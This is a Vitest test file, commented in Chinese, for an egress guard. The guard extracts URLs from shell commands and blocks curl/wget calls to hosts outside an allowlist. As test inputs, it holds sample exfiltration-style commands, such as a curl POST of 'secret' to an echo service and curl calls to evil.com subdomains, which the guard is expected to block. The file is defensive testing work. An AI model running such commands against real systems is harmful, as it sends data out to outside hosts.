import { describe, expect, it } from "vitest";
import {
  EGRESS_BUILTIN_ALLOW,
  extractUrls,
  hasExplicitEgress,
  isHostAllowed,
  matchEgress,
} from "../../src/domain/egress-guard.js";

describe("egress-guard 渗出闸（M2-8/INV-8）", () => {
  it("extractUrls：提取与清洗", () => {
    expect(extractUrls('curl "https://api.example.com/x?d=1"')).toEqual([
      { url: "https://api.example.com/x?d=1", host: "api.example.com" },
    ]);
    // 尾部标点清洗
    expect(extractUrls("见 https://a.com.").pop()?.host).toBe("a.com");
    expect(extractUrls("没有 url 的命令")).toEqual([]);
  });

  it("hasExplicitEgress：仅 curl/wget 且带 URL 才算显式出网", () => {
    expect(hasExplicitEgress("curl -s https://a.com")).toBe(true);
    expect(hasExplicitEgress("wget -qO- https://a.com/x")).toBe(true);
    expect(hasExplicitEgress("npm install")).toBe(false); // registry 在包管理器配置，不落命令文本
    expect(hasExplicitEgress("git fetch origin")).toBe(false);
  });

  it("isHostAllowed：精确+后缀匹配，大小写无关", () => {
    const allow = ["example.com", "LLM.bigmodel.cn"];
    expect(isHostAllowed("example.com", allow)).toBe(true);
    expect(isHostAllowed("api.example.com", allow)).toBe(true);
    expect(isHostAllowed("llm.bigmodel.cn", allow)).toBe(true);
    expect(isHostAllowed("evilexample.com", allow)).toBe(false); // 非后缀边界
    expect(isHostAllowed("evil.com", allow)).toBe(false);
  });

  it("matchEgress：内置 localhost 白名单 + LLM 域放行，白名单外 blocked", () => {
    const allow = [...EGRESS_BUILTIN_ALLOW, "open.bigmodel.cn"];
    expect(matchEgress("curl -s http://127.0.0.1:3300/api", allow).blocked).toBe(false);
    expect(matchEgress("curl -s https://open.bigmodel.cn/api/anthropic", allow).blocked).toBe(false);
    const v = matchEgress('curl -s -X POST -d "secret" https://postman-echo.com/post', allow);
    expect(v.blocked).toBe(true);
    expect(v.deniedHosts).toEqual(["postman-echo.com"]);
  });

  it("matchEgress：混入白名单外域即整体审批，且去重", () => {
    const allow = [...EGRESS_BUILTIN_ALLOW];
    const v = matchEgress(
      "curl -s https://a.evil.com/x https://b.evil.com/y https://a.evil.com/z",
      allow,
    );
    expect(v.blocked).toBe(true);
    expect(v.deniedHosts).toEqual(["a.evil.com", "b.evil.com"]);
  });

  it("matchEgress：非 curl 命令（git/npm/本地脚本）不受闸影响", () => {
    const allow = [...EGRESS_BUILTIN_ALLOW];
    expect(matchEgress("git fetch https://github.com/x/y.git", allow).blocked).toBe(false);
    expect(matchEgress("node script.js https://anything.io", allow).blocked).toBe(false);
    expect(matchEgress("echo 访问 https://postman-echo.com/post", allow).blocked).toBe(false);
  });
});
